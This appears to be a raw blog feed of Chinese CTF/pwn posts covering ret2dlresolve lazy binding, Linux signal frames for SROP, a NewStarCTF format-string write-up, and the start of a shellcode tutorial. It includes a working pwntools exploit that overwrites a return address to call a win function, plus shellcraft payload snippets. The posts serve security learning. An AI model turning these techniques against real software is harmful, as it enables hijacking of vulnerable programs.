class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># PLT[0] - 动态链接器入口(所有函数共用)</span><br>push   [GOT + <span class="hljs-number">8</span>]       <span class="hljs-comment">; 压入 link_map</span><br><span class="hljs-keyword">jmp </span>   [GOT + <span class="hljs-number">16</span>]       <span class="hljs-comment">; 跳转到 _dl_runtime_resolve</span><br><br><span class="hljs-comment"># PLT[n] - 第n个函数的桩代码 (n &gt;= 1)</span><br>PLT[n]:<br><span class="hljs-keyword">jmp </span>   [GOT + (n + <span class="hljs-number">2</span>) * <span class="hljs-number">8</span>]  <span class="hljs-comment">; 跳转到 GOT[n + 2]</span><br>push   (n<span class="hljs-number">-1</span>)            <span class="hljs-comment">; 压入重定位索引</span><br><span class="hljs-keyword">jmp </span>   PLT[<span class="hljs-number">0</span>]           <span class="hljs-comment">; 跳转到动态链接器</span><br></code></pre></td></tr></table></figure><p>注意我仅讨论了linux x86-64架构，其它架构核心思想应该都相同…</p><p>这样看是不是把上面的串起来了，第一次调用printf时，<code>call printf@plt &lt;printf@plt&gt;</code>，即调用PLT[1]，开始执行PLT[1]的代码，第一条代码为<code>jmp [GOT + (n + 2) * 8]</code>，而此时GOT[3]还未放入printf的真实地址，其初始化地址其实就是<code>PLT[1] + 6</code>,也就是下一条指令<code>push 0</code>，然后跳转到PLT[0]执行<code>push [GOT + 8]</code>，压入link_map，最后<code>jmp [GOT + 16]</code>，跳转执行<code>_dl_runtime_resolve</code>，此时才是真正解析函数真实地址的地方，我们构造利用的关键</p><p>而当第二次调用printf时，依旧<code>call printf@plt &lt;printf@plt&gt;</code>调用PLT[1]，依旧<code>jmp [GOT + (n + 2) * 8]</code>，而此时printf已经被解析，GOT[3]中已经存入了printf的真实地址，便会直接执行printf，后面的代码便不再会执行了，可以看到，只有在第一次解析时有<code>_dl_runtime_resolve</code>的参与，后面便可以直接在GOT中找到真实地址了，这便是今日讨论的<strong>延迟绑定</strong>的精髓所在</p><p>这种设计哲学，既避免了程序启动阶段不必要的解析性能开销，同时又保证了后续调用的执行效率，真是无比智慧啊~</p><p>然而…</p><p>为了支持这种按需解析机制，ELF在程序中保留了完整的重定位信息与符号描述结构，并允许动态链接器在运行时根据这些信息修改GOT内容，这一设计在提升<code>灵活性</code>的同时，也为我们的<strong>攻击面</strong>埋下了伏笔…</p><p>通过伪造<code>link_map</code>以及<strong>重定位索引</strong>，我们可以在程序可控的内存区域中构造出符合ELF规范的<code>Elf64_Rela</code>,符号表(<code>.dynsym</code>)以及字符串表(<code>.dynstr</code>)等关键结构体，使程序在执行<code>_dl_runtime_resolve</code>时误以为这些数据来源于合法的ELF映像，从而按照既定的动态链接流程解析并跳转到我们指定的函数地址…</p><p>程序以为它在正常地解析一个printf函数，殊不知，整个解析过程都被我们控制，直接解析成了<code>system(/bin/sh)</code>，哈哈哈哈哈</p><p>哪个才是真正的我，我自己也不知道…</p><p class="note note-primary">Full Relro : 你在说什么?</p><p>全剧终…</p><p>to be continued</p><p>补充:</p><p>突然想到这一篇的tag是OS，那我就只写OS得了，后面在pwn的tag里专门开一个讲攻击，虽然网上有很多模板，但加我一个又何妨?</p><p>最近好多比赛，好难!被打到怀疑人生了，路漫漫其修远兮啊…</p><p>最后，祝大家新年快乐!</p><p>虽然这是一篇静态博客根本没人看，但我还是写得好像有很多人看一样，roxy，你这家伙…</p><p>感谢阅读…</p><p>生活愉快…</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2dlresolve</tag>
      
      <tag>动态链接</tag>
      
      <tag>延迟绑定</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>signal</title>
    <link href="/2026/01/15/signal/"/>
    <url>/2026/01/15/signal/</url>
    
    <content type="html"><![CDATA[<p>此篇blog为SROP那一章的后续，主要补充一下linux中的<strong>信号</strong>处理机制</p><p>为什么写这篇呢，因为我发现我虽然能构造SROP利用，但是却并不明白为什么能这么做</p><p>最近在学习操作系统时，学习到了这么一个知识点，进程在进行上下文切换时，也会有保存寄存器，恢复寄存器这样的一个动作，但是保存的地方是内核栈，那我为什么在用户栈布置上下文(context)时能<code>make sense</code>呢?</p><p><img src="/images/9.png" alt="如图所示"></p><p>经过查阅资料发现，原来这两样东西完全是不同的机制。</p><p>第一种情况，在进程进行上下文切换时，例如从进程A切换至进程B，进程A的寄存器此时保存在内核栈，待进程A重新被调度时，才会从内核栈恢复寄存器，重新进入进程A，此时用户不可控。</p><p>第二种情况，也就是本文的主题，即linux系统的信号处理机制</p><p>信号在硬件层面发生异常&#x2F;中断时，内核会向进程发送<strong>信号</strong>，通知用户进程发生了某种事情</p><p>常见如:</p><ul><li><p>除数为零(异常) -&gt; SIGFPE</p></li><li><p>非法内存访问(异常) -&gt; SIGSEGV 也就是pwn手经常看到的<code>segmentation fault</code></p></li><li><p>当你按下<code>Ctrl+C</code>时(产生键盘中断) -&gt; SIGINT</p></li></ul><p>那么，内核如何发送这个信号到用户进程呢，本质是在用户态调用了一个<code>signal handler</code>函数，想象一下，用户进程正在愉快地执行，此时发生了某种事件，于是内核决定发送信号，CPU此时立即进入内核态(trap)，此时内核要保存被打断的寄存器，这便是第一种情况<code>受限直接执行</code>的一部分，但是这些寄存器只是暂时保存在内核栈，不是最终保存位置，我们接着看。</p><p>接下来，内核判断是否要处理信号，内核在一系列判断后，如果确定要发送这个<code>signal handler</code>，于是进入<code>signal delivery path</code>，接下来便是关键步骤:内核<strong>伪造</strong>用户态调用栈</p><p>内核会在用户栈上分配一个<code>sigframe</code>，简化后大致如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rt_sigframe</span> &#123;</span><br>    <span class="hljs-type">char</span> pretcode[<span class="hljs-number">8</span>];   <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> <span class="hljs-title">uc</span>;</span>   <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">siginfo</span> <span class="hljs-title">info</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>这些分别代表什么？我们只需要关注两样东西</p><p>首先，<code>char pretcode[8];</code>，这个地址通常是glibc提供的<code>trampoline</code>，我们不妨叫它<code>rt_sigreturn_trampoline</code>，指令你应该很熟悉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rax, SYS_rt_sigreturn  //linux x86-64下即是15<br>syscall<br></code></pre></td></tr></table></figure><p>然后，<code>ucontext</code>见下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  uc_flags;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> *<span class="hljs-title">uc_link</span>;</span><br>    <span class="hljs-type">stack_t</span>        uc_stack;<br>    <span class="hljs-type">sigset_t</span>       uc_sigmask;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span> <span class="hljs-title">uc_mcontext</span>;</span>  <span class="hljs-comment">// 想我了吗?</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>看到<code>sigcontext</code>了吗，这便是SROP中利用的关键，保存着所有的寄存器</p><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rax;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rcx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> *<span class="hljs-title">fpstate</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> reserved1[<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>内核在用户栈伪造了这个<code>sigframe</code>后将<code>rip</code>设置为<code>handler</code>(即原执行流变为执行信号处理函数)，将<code>rsp</code>设置为<code>rt_sigreturn_trampoline</code>，在执行完信号处理函数后，因为<code>handler</code>函数的最后一条指令通常是<code>ret</code>，因此，<code>pop rip</code>，执行<code>rt_sigreturn_trampoline</code></p><p>系统再次进入内核态，无条件地信任它自己在用户栈设置的<code>sigframe</code>，从<code>sigcontext</code>中恢复所有保存的寄存器，程序恢复至被中断前的执行点</p><p>总结一下全过程:</p><p>1.用户代码正常运行，突然，发生程序异常&#x2F;硬件中断等”事故”</p><p>2.CPU进入内核态并保存寄存器到<code>pt_regs</code>(内核栈中的一个结构体，保存关键寄存器)</p><p>3.内核决定要运行<code>handler</code>:在用户栈写<code>rt_sigframe</code>(把<code>pt_regs</code>的快照写到<code>uc_mcontext</code>)，然后修改<code>pt_regs</code>使得<code>rip=handler</code>,<code>rsp=rt_sigframe</code>, 并设置<code>handler</code>参数寄存器</p><p>4.内核执行<code>return-to-user</code>(<strong>iretq</strong>)，CPU恢复并开始执行<code>handler</code>(看起来像是<code>normal call</code>)</p><p>5.<code>handler</code>执行完，ret，返回到<code>trampoline</code>，<code>trampoline</code> 做<code>syscall SYS_rt_sigreturn</code></p><p>6.内核进入<code>sys_rt_sigreturn</code>:<code>copy_from_user</code>把<code>rt_sigframe</code>中<code>sigcontext</code>保存的寄存器读回，写入 <code>pt_regs</code>，恢复信号</p><p>7.内核再次<code>return-to-user</code>(<strong>iretq</strong>)，CPU将<code>pt_regs</code>中的所有寄存器恢复到硬件，程序继续被中断前的执行点</p><p>至此，终于理解了SROP技术的本质:在用户栈上伪造一次“合法的信号处理返回现场”，然后<code>诱骗</code>内核执行<code>rt_sigreturn</code>(即想办法设置rax为15并syscall)，让内核按攻击者提供的上下文(<strong>sigcontext</strong>)恢复寄存器，彻底接管执行流!</p><p>感谢阅读!</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SROP</tag>
      
      <tag>linux信号机制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fmt_bss</title>
    <link href="/2026/01/02/fmt-bss/"/>
    <url>/2026/01/02/fmt-bss/</url>
    
    <content type="html"><![CDATA[<p>加餐~</p><p>今天依旧是一道格式化字符串漏洞的题目，题目出自NewStarCTF2025的week5pwn</p><p>题目给的提示-&gt;</p><p>hint:对于常规的栈上格式化字符串漏洞，可以任意构造自己的恶意数据来实现任意地址写，但是对于非栈上变量来说，就无法直接给出目的地址的指针，此时就需要留意栈上残留的内容，看看能不能找到可以利用的点(善用你的gdb)…</p><p>先来看看题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  setup();<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00102048);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_001020c0);<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-built_in">memset</span>(global_buffer,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(&amp;DAT_0010210d);   #一段嘲讽你的话<br>    read(<span class="hljs-number">0</span>,global_buffer,<span class="hljs-number">0xff</span>);<br>    <span class="hljs-built_in">printf</span>(global_buffer);  <span class="hljs-meta">#xswlhhh</span><br>    iVar1 = <span class="hljs-built_in">strcmp</span>(global_buffer,<span class="hljs-string">&quot;end\n&quot;</span>);<br>  &#125; <span class="hljs-keyword">while</span> (iVar1 != <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0010211a);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在后门函数<code>win</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  FILE *__stream;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">72</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  fgets(local_58,<span class="hljs-number">0x40</span>,__stream);<br>  <span class="hljs-built_in">printf</span>(&amp;DAT_00102010,local_58);<br>  fclose(__stream);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>明显存在格式化字符串漏洞，但是对比<code>bss_got</code>的不同之处在于之前我们输入形如<code>AAAA.%p.%p.%p.%p</code>可以看到A写在哪里以实现任意地址写，这次是bss段上的fmt，因此并没有那么容易任意写，我们看看有哪些可以利用的地方，比如，栈上残留的某个<strong>指针</strong>?</p><p><img src="/images/7.png" alt="stack"></p><p>经过敏锐的观察，不难发现，第6个地址0x7fffffffdda0与第26个地址0x7fffffffde00在栈上存在着某种关系…</p><p><code>0x7fffffffdda0 —▸ 0x7fffffffde00 ◂— 0</code></p><p>怎么理解呢，二者也就是<strong>指针</strong>的关系</p><p>0x7fffffffdda0是一个栈地址，存储着值0x7fffffffde00(即指向这个地址的指针)</p><p>0x7fffffffde00是另一个栈地址，这里存储着0</p><p>那么就有思路了，我们用逐字节写的方式修改<code>0x7fffffffdda0</code>处的指针，使其指向返回地址(rip)的位置，同理，用逐字节写的方式修改<code>0x7fffffffde00</code>处的值为win函数所在的地址</p><p>可能略微有点抽象，但结果就是，返回地址(rip)变为了<code>0x7fffffffdda0</code>，而这又是一个指向<code>0x7fffffffde00</code>的指针，而<code>0x7fffffffde00</code>处的值已经被我们改写为了<code>win</code>，从而获得了<code>flag</code></p><p>真是精妙绝伦啊~</p><p>还有一点需要注意的是，程序是<code>pie enabled</code>(区别于<code>ASLR</code>)，但是也很明显，可以通过泄露的第一个地址<code>0x555555558060</code>获得pie基址</p><p><img src="/images/8.png" alt="vmmap"></p><p>使用vmmap可以看到<code>pie_base = p1 - 0x4060</code></p><p>那么<code>win = pie_base + win偏移</code></p><p>接下来就来展示一下exp吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p&#x27;</span>)<br>p_base = <span class="hljs-built_in">int</span>(p.recvline(keepends=<span class="hljs-literal">False</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x004060</span>    <span class="hljs-comment">#不保留换行符</span><br>log.success(<span class="hljs-string">f&#x27;p_base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(p_base)&#125;</span>&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p %p %p %p %p %p&#x27;</span>)<br>rip = <span class="hljs-built_in">int</span>(p.recvline(keepends=<span class="hljs-literal">False</span>).decode().split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">0x98</span>  <span class="hljs-comment">#计算rip，由图可知rip = p6 - 0x98</span><br>log.success(<span class="hljs-string">f&#x27;rip -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)&#125;</span>&#x27;</span>)<br><br>win = p_base + <span class="hljs-number">0x001289</span>  <span class="hljs-comment">#objdump -d ./bss_fmt | grep &quot;win&quot;</span><br>log.success(<span class="hljs-string">f&#x27;win -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(win)&#125;</span>&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%(<span class="hljs-number">256</span>*<span class="hljs-number">256</span>)&#125;</span>c%6$hn&#x27;</span>.encode())  <span class="hljs-comment">#改为rip</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())  <span class="hljs-comment">#重复逐字节写...</span><br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">1</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">2</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">3</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">4</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">5</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())  <span class="hljs-comment">#计划，通!</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>也是成功拿到<code>flag</code>了~</p><p>经过此题，应该能更加深刻地理解指针的本质，希望你能有所收获</p><p>感谢阅读…</p><p>天天开心…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fmt</tag>
      
      <tag>指针</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2026/01/02/shellcode/"/>
    <url>/2026/01/02/shellcode/</url>
    
    <content type="html"><![CDATA[<p>今天来分享一下关于shellcode编写技术的一些题目，在此之前，需要你对x86-64的汇编指令，寄存器调用约定，栈有一定了解</p><p>先来讲比较简单的ret2shellcode技术</p><p>前提条件是<code>NX</code>保护没开，即栈可执行</p><p>因此可以直接使用pwntools的一个非常强大的集成功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>通常payload是:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = shellcode + 偏移 + addr_to_shellcode(返回地址)<br></code></pre></td></tr></table></figure><p>此时shellcode在栈上，你可能需要先泄露栈地址，当然在本地可以用gdb一眼看出</p><p>当然在这方面还有<code>ret2reg</code>,<code>NOP sled</code>等技术，就不展开了(´・ω・&#96;)，感兴趣可以自行查阅资料</p><p>下面分享一些我遇到的与shellcode编写相关的题目</p><p>这些题目普遍与<code>mmap</code>(Memory Map)相关，其是Unix&#x2F;Linux提供的一种将文件或设备映射到进程虚拟内存空间的机制，使得文件内容可以像操作普通内存一样被访问</p><p>先来看第一题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  code *__buf;<br>  init(param_1);<br>  __buf = (code *)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x114514</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input a small function (also after compile)&quot;</span>);<br>  read(<span class="hljs-number">0</span>,__buf,<span class="hljs-number">0x14</span>);<br>  clear();<br>  (*__buf)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mmap((void *)0x114514,0x1000,7,0x22,-1,0)</code>怎么理解呢，<code>0x114514</code>代表指定映射的期望地址,但也不一定必须是这儿(xswl),<code>0x1000</code>代表长度，这里是映射一页(4KB),7代表权限为<code>RWX</code>，可读可写可执行，这是关键，后面则表示这是一个纯内存页，不关联任何文件</p><p>所以这道题便很好理解了，直接把编写好的shellcode写入buf即可，接下来程序便会直接将其当作函数指针调用，并执行你的shellcode</p><p>但是关键点在于buf的长度只有0x14(20)，所以我们手动放大一下</p><p>首先关于read(0,buf,0x14)的寄存器调用约定，rax存放read的系统调用号0，rdi为第一个调用的寄存器，是fd(0,stdin)，rsi第二个，为buf的起始地址，rdx是读取的大小，最后执行<code>syscall</code>，就相当于执行了这么一个读取的指令</p><p>要扩大读取范围，我们将rdx修改为<code>0xff</code>(应该够了，注意限制，尽量少用一点字节数)，把rsi设置为当前的rip后0x20(大于0x14即可，同样限制一下字节数)的地址，调用syscall，写入shellcode，最后跳转rsi执行即可</p><p>我的exp，只用了13字节便成功改写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 